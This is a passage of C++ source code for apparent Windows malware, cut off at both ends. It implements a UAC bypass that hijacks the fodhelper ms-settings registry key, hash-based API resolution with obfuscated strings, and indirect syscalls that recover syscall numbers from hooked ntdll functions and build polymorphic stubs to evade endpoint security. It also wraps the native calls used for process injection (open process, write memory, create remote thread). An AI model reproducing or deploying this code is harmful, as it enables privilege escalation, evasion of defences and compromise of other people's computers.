                } while (DynAPI::Proc32Next(hSnap, &pe));
            }
            DynAPI::CloseH(hSnap);
        }
        return pid;
    }
}

namespace Utils {
    namespace UACBypass {
        void ExecuteAdmin() {
            if (Impersonator::IsAdmin()) return;
            SLOG("[*] Attempting UAC Bypass via fodhelper...");
            if (!DynAPI::RegCreateKeyEx || !DynAPI::RegSetValueEx || !DynAPI::ShellExecExA) {
                SLOG("[-] UAC Bypass failed: Critical APIs not loaded.");
                return;
            }

            typedef DWORD(WINAPI* GetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
            auto k32Str = OBFS_S("kernel32.dll");
            HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
            if (!hK32) return;
            auto gmfwStr = OBFS_S("GetModuleFileNameW");
            auto pGetModFnW = (GetModuleFileNameW_t)Internal::_GetProcAddress(hK32, gmfwStr.c_str());
            if (!pGetModFnW) return;

            WCHAR szPath[MAX_PATH];
            if (pGetModFnW(NULL, szPath, MAX_PATH) == 0) return;

            HKEY hKey;
            OBFS_W_DECL(subKey, L"Software\\Classes\\ms-settings\\Shell\\Open\\command");
            std::wstring command = L"\"";
            command += szPath;
            command += L"\"";
            LSTATUS status = DynAPI::RegCreateKeyEx(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
            if (status == ERROR_SUCCESS) {
                status = DynAPI::RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), (DWORD)((command.length() + 1) * sizeof(WCHAR)));
                if (status != ERROR_SUCCESS) SLOG("[-] RegSetValueEx (Default) failed: %ld", status);
                OBFS_W_DECL(delegateExec, L"DelegateExecute");
                std::wstring empty = L"";
                status = DynAPI::RegSetValueEx(hKey, delegateExec, 0, REG_SZ, (const BYTE*)empty.c_str(), (DWORD)((empty.length() + 1) * sizeof(WCHAR)));
                OBFS_W_WIPE(delegateExec);
                if (status != ERROR_SUCCESS) SLOG("[-] RegSetValueEx (DelegateExecute) failed: %ld", status);
                DynAPI::RegClose(hKey);
                SLOG("[+] Registry hijacked, launching fodhelper...");
                SLOG_CLOSE();
                SHELLEXECUTEINFOA sei = { sizeof(sei) };
                sei.lpVerb = NULL;
                sei.lpFile = OBFS_S("C:\\Windows\\System32\\fodhelper.exe").c_str();
                sei.nShow = SW_HIDE;
                if (DynAPI::ShellExecExA(&sei)) {
                    Internal::SleepMs(1000);

                    typedef VOID(WINAPI* ExitProcess_t)(UINT);
                    auto epStr = OBFS_S("ExitProcess");
                    auto pExitProc = (ExitProcess_t)Internal::_GetProcAddress(hK32, epStr.c_str());
                    if (pExitProc) pExitProc(0);
                } else {
                    SLOG_INIT();
                    SLOG("[-] ShellExecuteExA failed (Error: %lu)", Internal::_GetLastError ? Internal::_GetLastError() : 0);
                }
            } else {
                SLOG("[-] RegCreateKeyEx failed (Error: %ld)", status);
            }
            OBFS_W_WIPE(subKey);
        }
    }
}

#include <stdio.h>
#include <winternl.h>
#include <intrin.h>
namespace Resolver {
    DWORD g_runtimeXorKey = 0;
    DWORD HashStringW(const wchar_t* str, size_t len) {
        DWORD hash = HASH_SEED;
        for (size_t i = 0; i < len; i++) {
            wchar_t c = str[i];
            if (c >= L'A' && c <= L'Z') c += 32;
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    void InitRuntimeKeys() {
        unsigned __int64 tsc1 = __rdtsc();
        volatile DWORD entropy = 0;
        for (volatile int i = 0; i < 64; i++) entropy ^= i;
        unsigned __int64 tsc2 = __rdtsc();
        DWORD key = (DWORD)(tsc1 ^ (tsc1 >> 32));
        key ^= (DWORD)(tsc2 ^ (tsc2 >> 17));
        key ^= (DWORD)((ULONG_PTR)&key);  
#ifdef _WIN64
        key ^= (DWORD)__readgsqword(0x40); 
        key ^= (DWORD)__readgsqword(0x48); 
#else
        key ^= (DWORD)__readfsdword(0x20); 
        key ^= (DWORD)__readfsdword(0x24); 
#endif
        if (key == 0) key = 0xDEADBEEF;
        g_runtimeXorKey = key;
        DWORD* hashes[] = {
            &HASH_NTDLL, &HASH_KERNEL32, &HASH_KERNELBASE, &HASH_ADVAPI32,
            &HASH_WININET, &HASH_CRYPT32, &HASH_USER32, &HASH_WS2_32,
            &HASH_IPHLPAPI, &HASH_OLE32, &HASH_OLEAUT32, &HASH_VFW32,
            &HASH_BCRYPT, &HASH_SHELL32,
            &HASH_LOADLIBRARYA, &HASH_GETPROCADDRESS, &HASH_MULTIBYTETOWIDECHAR,
            &HASH_VIRTUALALLOC, &HASH_VIRTUALPROTECT, &HASH_VIRTUALFREE,
            &HASH_GETMODULEHANDLEA, &HASH_GETSYSTEMINFO, &HASH_GETCOMPUTERNAMEA,
            &HASH_GETSYSTEMDIRECTORYA, &HASH_GETDISKFREESPACEEXA,
            &HASH_GLOBALMEMORYSTATUSEX, &HASH_GETCURRENTPROCESSID,
            &HASH_GETCURRENTTHREADID, &HASH_SETPROCESSWORKINGSETSIZE,
            &HASH_SETTHREADEXECUTIONSTATE, &HASH_GETTICKCOUNT,
            &HASH_CREATEMUTEXA, &HASH_GETLASTERROR, &HASH_GETMODULEFILENAMEA,
            &HASH_FILETIMETOSYSTEMTIME, &HASH_CREATEFILEA, &HASH_GETFILETIME,
            &HASH_CLOSEHANDLE, &HASH_CREATETOOLHELP32SNAPSHOT,
            &HASH_THREAD32FIRST, &HASH_THREAD32NEXT, &HASH_OPENTHREAD,
            &HASH_SUSPENDTHREAD, &HASH_RESUMETHREAD,
            &HASH_GETPROCESSHEAP, &HASH_HEAPALLOC, &HASH_HEAPFREE,
            &HASH_CREATEFILEMAPPINGA, &HASH_MAPVIEWOFFILE, &HASH_UNMAPVIEWOFFILE,
            &HASH_GETUSERNAMEA, &HASH_REGCREATEKEYEXA, &HASH_REGSETVALUEEXA,
            &HASH_REGOPENKEYEXA, &HASH_REGQUERYVALUEEXA, &HASH_REGCLOSEKEY,
            &HASH_OPENPROCESSTOKEN, &HASH_GETTOKENINFORMATION,
            &HASH_GETFOREGROUNDWINDOW, &HASH_GETWINDOWTEXTA,
            &HASH_GETLASTINPUTINFO, &HASH_ENUMDISPLAYDEVICESA,
            &HASH_WSASTARTUP, &HASH_WSACLEANUP, &HASH_SOCKET, &HASH_CONNECT,
            &HASH_SEND, &HASH_RECV, &HASH_CLOSESOCKET, &HASH_GETADDRINFO,
            &HASH_FREEADDRINFO, &HASH_SETSOCKOPT,
            &HASH_INTERNETOPENA, &HASH_INTERNETOPENURLA,
            &HASH_INTERNETREADFILE, &HASH_INTERNETCLOSEHANDLE,
            &HASH_CRYPTSTRINGTOBINARYA,
            &HASH_BCRYPTOPENALGORITHMPROVIDER, &HASH_BCRYPTGETPROPERTY,
            &HASH_BCRYPTCREATEHASH, &HASH_BCRYPTHASHDATA,
            &HASH_BCRYPTFINISHHASH, &HASH_BCRYPTDESTROYHASH,
            &HASH_BCRYPTCLOSEALGORITHMPROVIDER, &HASH_BCRYPTGENRANDOM,
            &HASH_BCRYPTSETPROPERTY, &HASH_BCRYPTGENERATESYMMETRICKEY,
            &HASH_BCRYPTENCRYPT, &HASH_BCRYPTDECRYPT, &HASH_BCRYPTDESTROYKEY,
            &HASH_COINITIALIZEEX, &HASH_COINITIALIZESECURITY,
            &HASH_COCREATEINSTANCE, &HASH_COUNINITIALIZE,
            &HASH_VARIANTCLEAR,
            &HASH_CAPGETDRIVERDESCRIPTIONA,
            &HASH_ISUSERANADMIN,
        };
        for (DWORD* p : hashes) *p ^= key;
    }
    LPVOID GetAPIByHash(DWORD hashDll, DWORD hashFunc) {
#ifdef _WIN64
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
        if (!pPeb || !pPeb->Ldr) return NULL;
        PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;

        bool walkFwd = (Polymorph::FastRandRange(2) == 0);

        DWORD modCount = 0;
        PLIST_ENTRY probe = head->Flink;
        while (probe && probe != head && modCount < 256) {
            modCount++;
            probe = probe->Flink;
        }

        DWORD startOff = (modCount > 1) ? Polymorph::FastRandRange(modCount) : 0;

        PLIST_ENTRY startEntry = walkFwd ? head->Flink : head->Blink;
        for (DWORD s = 0; s < startOff && startEntry != head; s++) {
            startEntry = walkFwd ? startEntry->Flink : startEntry->Blink;
        }
        if (startEntry == head) startEntry = walkFwd ? head->Flink : head->Blink;

        PLIST_ENTRY curr = startEntry;
        DWORD visited = 0;
        while (curr && curr != head && visited < modCount + 1) {
#ifdef _WIN64
            PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)curr - 0x10);
#else
            PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)curr - 0x08);
#endif
            curr = walkFwd ? curr->Flink : curr->Blink;
            visited++;

            if (curr == head) curr = walkFwd ? head->Flink : head->Blink;

            if (visited >= modCount) {  }

            if (!pEntry->FullDllName.Buffer || !pEntry->DllBase) continue;
            wchar_t* filename = pEntry->FullDllName.Buffer;
            size_t totalLen = pEntry->FullDllName.Length / sizeof(WCHAR);
            size_t filenameLen = totalLen;
            for (size_t i = 0; i < totalLen; i++) {
                if (pEntry->FullDllName.Buffer[i] == L'\\' || pEntry->FullDllName.Buffer[i] == L'/') {
                    filename = &pEntry->FullDllName.Buffer[i + 1];
                    filenameLen = totalLen - (i + 1);
                }
            }
            if ((HashStringW(filename, filenameLen) ^ g_runtimeXorKey) == hashDll) {
                if (hashFunc == 0) return pEntry->DllBase;
                PBYTE pBase = (PBYTE)pEntry->DllBase;
                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
                PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
                DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                if (expRva == 0) continue;
                PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);
                PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
                PWORD pOrds = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
                PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);

                DWORD numNames = pExp->NumberOfNames;
                DWORD startIdx = (numNames > 1) ? Polymorph::FastRandRange(numNames) : 0;
                for (DWORD j = 0; j < numNames; j++) {
                    DWORD i = (startIdx + j) % numNames;
                    if ((HashString((LPCSTR)(pBase + pNames[i])) ^ g_runtimeXorKey) == hashFunc) {
                        return pBase + pFuncs[pOrds[i]];
                    }
                }
            }
        }
        return NULL;
    }
}

#include <thread>
#include <chrono>
#include <mutex>
namespace Syscalls {
    static std::mutex g_syscallMutex;
    WORD GetSSN(const std::string& funcName) {
        auto ntdllObj = OBFS_S("ntdll.dll");
        LPVOID pFunc = Resolver::GetAPIByHash(
            Resolver::HashString(ntdllObj.c_str()) ^ Resolver::g_runtimeXorKey,
            Resolver::HashString(funcName.c_str()) ^ Resolver::g_runtimeXorKey);
        if (!pFunc) {
            SYSCALL_LOG("Resolve failed for " + funcName, 0, 0);
            return 0;
        }
        unsigned char* bytes = (unsigned char*)pFunc;
#ifdef _WIN64
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8) {
            return *(WORD*)(bytes + 4);
        }
        if (bytes[3] == 0xB8 && bytes[6] == 0x00 && bytes[7] == 0x00) {
            return *(WORD*)(bytes + 4);
        }
        if ((bytes[0] == 0xE9 || bytes[0] == 0xCC || bytes[0] == 0xEB) &&
            bytes[3] == 0xB8 && bytes[6] == 0x00 && bytes[7] == 0x00) {
            WORD candidate = *(WORD*)(bytes + 4);
            if (candidate < 0x1000) {
                SYSCALL_LOG("Hooked (short jmp) " + funcName, candidate, 0);
                return candidate;
            }
        }
        if (bytes[0] == 0xFF && bytes[1] == 0x25) {
            if (bytes[6] == 0x4C && bytes[7] == 0x8B && bytes[8] == 0xD1 && bytes[9] == 0xB8) {
                WORD candidate = *(WORD*)(bytes + 10);
                if (candidate < 0x1000) {
                    SYSCALL_LOG("Hooked (jmp [rip]) " + funcName, candidate, 0);
                    return candidate;
                }
            }
        }
        for (WORD i = 1; i < 500; i++) {
            unsigned char* down = bytes + (i * 0x20);
            if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
                return *(WORD*)(down + 4) - i;
            }
            if (down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
                return *(WORD*)(down + 4) - i;
            }
            if ((down[0] == 0xE9 || down[0] == 0xCC) &&
                down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
                WORD candidate = *(WORD*)(down + 4) - i;
                if (candidate < 0x1000) return candidate;
            }
            unsigned char* up = bytes - (i * 0x20);
            if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
                return *(WORD*)(up + 4) + i;
            }
            if (up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
                return *(WORD*)(up + 4) + i;
            }
            if ((up[0] == 0xE9 || up[0] == 0xCC) &&
                up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
                WORD candidate = *(WORD*)(up + 4) + i;
                if (candidate < 0x1000) return candidate;
            }
        }
#else
        if (bytes[0] == 0xB8) {
            return *(WORD*)(bytes + 1);
        }
        if (bytes[3] == 0x00 && bytes[4] == 0x00) {
            WORD candidate = *(WORD*)(bytes + 1);
            if (candidate < 0x1000) return candidate;
        }
        if ((bytes[0] == 0xE9 || bytes[0] == 0xCC) && bytes[5] == 0xB8) {
            WORD candidate = *(WORD*)(bytes + 6);
            if (candidate < 0x1000) return candidate;
        }
        for (WORD i = 1; i < 500; i++) {
            unsigned char* down = bytes + (i * 0x14);
            if (down[0] == 0xB8) return *(WORD*)(down + 1) - i;
            if ((down[0] == 0xE9 || down[0] == 0xCC) && down[5] == 0xB8) {
                WORD c = *(WORD*)(down + 6) - i;
                if (c < 0x1000) return c;
            }
            unsigned char* up = bytes - (i * 0x14);
            if (up[0] == 0xB8) return *(WORD*)(up + 1) + i;
            if ((up[0] == 0xE9 || up[0] == 0xCC) && up[5] == 0xB8) {
                WORD c = *(WORD*)(up + 6) + i;
                if (c < 0x1000) return c;
            }
        }
#endif
        SYSCALL_LOG("SSN not found for " + funcName, 0, 0);
        return 0;
    }
    LPVOID GetSyscallGadget() {
        static LPVOID pGadget = NULL;
        if (pGadget) return pGadget;
        auto ntdllObj = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllObj.c_str());
        if (!hNtdll) return NULL;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((size_t)hNtdll + dos->e_lfanew);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        auto textSec = OBFS_S(".text");
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (Internal::InlineStrEq((char*)section[i].Name, textSec.c_str())) {
                unsigned char* start = (unsigned char*)((size_t)hNtdll + section[i].VirtualAddress);
                DWORD size = section[i].Misc.VirtualSize;
                for (DWORD j = 0; j < size - 2; j++) {
#ifdef _WIN64
                    if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
#else
                    if (start[j] == 0x0F && start[j + 1] == 0x34 && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
                    if (start[j] == 0xCD && start[j + 1] == 0x2E && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
#endif
                }
            }
        }
        return NULL;
    }
    static LPVOID GetStubBuffer() {
        static LPVOID pBuf = NULL;
        static HANDLE hSection = NULL;
        if (!pBuf) {
#ifndef FILE_MAP_EXECUTE
#define FILE_MAP_EXECUTE 0x0020
#endif
            if (Internal::_CreateFileMappingA && Internal::_MapViewOfFile) {
                hSection = Internal::_CreateFileMappingA(
                    INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
                    0, 0x1000, NULL);
                if (hSection) {
                    pBuf = Internal::_MapViewOfFile(hSection,
                        FILE_MAP_WRITE | FILE_MAP_READ | FILE_MAP_EXECUTE,
                        0, 0, 0x1000);
                }
            }
            if (!pBuf) {
                pBuf = Internal::_VirtualAlloc(NULL, 0x1000,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            }
        }
        return pBuf;
    }
    static void SecureWipeStub(LPVOID pExec, size_t len) {
#if POLY_SYSCALLS

        Polymorph::RandomWipeStub(pExec, len);
#else
        volatile unsigned char* p = (volatile unsigned char*)pExec;
        for (size_t i = 0; i < len; i++) {
            p[i] = 0;
        }
#endif
    }
    static bool FlipStubProtection(LPVOID pExec, DWORD newProt) {
        DWORD oldProt = 0;
        return Internal::_VirtualProtect(pExec, POLY_STUB_MAX, newProt, &oldProt) != FALSE;
    }

#if POLY_SYSCALLS

    #ifdef _WIN64
    #define BUILD_SYSCALL_STUB(ssnVal, gadgetPtr, stubName) \
        size_t stubName##_polyLen = Polymorph::BuildPolymorphicStub( \
            (unsigned char*)pExec, POLY_STUB_MAX, ssnVal, gadgetPtr);
    #else
    #define BUILD_SYSCALL_STUB_X86(ssnVal, gadgetPtr, stubName, retBytes) \
        size_t stubName##_polyLen = Polymorph::BuildPolymorphicStub( \
            (unsigned char*)pExec, POLY_STUB_MAX, ssnVal, gadgetPtr, retBytes);
    #endif

    #define SYSCALL_EXEC_COPY_AND_FLIP(stubName) \
        FlipStubProtection(pExec, PAGE_EXECUTE_READ);

    #define SYSCALL_EXEC_CLEANUP(stubName, resultVar) \
        FlipStubProtection(pExec, PAGE_READWRITE); \
        SecureWipeStub(pExec, stubName##_polyLen); \
        SYSCALL_LOG("", 0, resultVar);

#else

    #ifdef _WIN64
    #define BUILD_SYSCALL_STUB(ssnVal, gadgetPtr, stubName) \
        unsigned char stubName[] = { \
            0x4C, 0x8B, 0xD1, \
            0xB8, (unsigned char)((ssnVal) & 0xFF), (unsigned char)(((ssnVal) >> 8) & 0xFF), 0x00, 0x00, \
            0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
            0x41, 0xFF, 0xE3 \
        }; \
        *(size_t*)(stubName + 10) = (size_t)(gadgetPtr);
    #else
    #define BUILD_SYSCALL_STUB_X86(ssnVal, gadgetPtr, stubName, retBytes) \
        unsigned char stubName[] = { \
            0xB8, (unsigned char)((ssnVal) & 0xFF), (unsigned char)(((ssnVal) >> 8) & 0xFF), 0x00, 0x00, \
            0xBA, 0x00, 0x00, 0x00, 0x00, \
            0xFF, 0xE2, \
            0xC2, (unsigned char)((retBytes) & 0xFF), (unsigned char)(((retBytes) >> 8) & 0xFF) \
        }; \
        *(size_t*)(stubName + 6) = (size_t)(gadgetPtr);
    #endif

    #define SYSCALL_EXEC_COPY_AND_FLIP(stubName) \
        memcpy(pExec, stubName, sizeof(stubName)); \
        FlipStubProtection(pExec, PAGE_EXECUTE_READ);

    #define SYSCALL_EXEC_CLEANUP(stubName, resultVar) \
        FlipStubProtection(pExec, PAGE_READWRITE); \
        SecureWipeStub(pExec, sizeof(stubName)); \
        SYSCALL_LOG("", 0, resultVar);

#endif 

    #define SYSCALL_PREAMBLE(ntFuncName, ssnVar, gadgetVar) \
        static WORD ssnVar = GetSSN(OBFS_S(ntFuncName)); \
        static LPVOID gadgetVar = GetSyscallGadget(); \
        if (ssnVar == 0 || !gadgetVar) { \
            SYSCALL_LOG(ntFuncName " preamble fail", ssnVar, 0xC0000001); \
            return (NTSTATUS)0xC0000001; \
        }
    #define SYSCALL_EXEC_BEGIN() \
        std::lock_guard<std::mutex> lock(g_syscallMutex); \
        LPVOID pExec = GetStubBuffer(); \
        if (!pExec) return (NTSTATUS)0xC0000001;
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
    {
        SYSCALL_PREAMBLE("NtAllocateVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x18);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
    {
        SYSCALL_PREAMBLE("NtProtectVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
    {
        SYSCALL_PREAMBLE("NtWriteVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval) {
        SYSCALL_PREAMBLE("NtDelayExecution", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(BOOLEAN, LONGLONG*);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(BOOLEAN, LONGLONG*);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x08);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Alertable, DelayInterval);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG FreeType)
    {
        SYSCALL_PREAMBLE("NtFreeVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, RegionSize, FreeType);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtClose(HANDLE Handle) {
        SYSCALL_PREAMBLE("NtClose", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x04);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Handle);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle,
        ULONG ProcessInformationClass, PVOID ProcessInformation,
        ULONG ProcessInformationLength, PULONG ReturnLength)
    {
        SYSCALL_PREAMBLE("NtQueryInformationProcess", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle,
        ULONG ThreadInformationClass, PVOID ThreadInformation,
        ULONG ThreadInformationLength)
    {
        SYSCALL_PREAMBLE("NtSetInformationThread", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, ULONG, PVOID, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, ULONG, PVOID, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
        PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits,
        SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
    {
        SYSCALL_PREAMBLE("NtCreateThreadEx", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x2C);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    void SleepMs(DWORD milliseconds) {
        if (milliseconds == 0) return;
        LONGLONG delay = milliseconds * -10000LL;
        if (NtDelayExecution(FALSE, &delay) != 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));
        }
    }
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)
    {
        SYSCALL_PREAMBLE("NtReadVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId)
    {
        SYSCALL_PREAMBLE("NtOpenProcess", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
